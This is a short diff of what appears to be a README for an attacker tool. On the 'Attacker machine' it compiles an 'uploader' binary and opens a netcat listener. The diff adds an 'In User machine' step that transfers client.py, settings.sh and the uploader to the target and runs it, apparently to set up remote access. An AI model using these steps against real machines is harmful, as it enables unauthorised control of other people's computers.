@@ -12,5 +12,6 @@ In Attacker machine:
 --> gcc auto.c -o uploader    
 --> nc -nvlp (port)
 
-Transfer client.py,settings.sh, uploader    
-Run ./uploader  
+In User machine:  
+--> Transfer client.py,settings.sh, uploader      
+--> Run ./uploader    
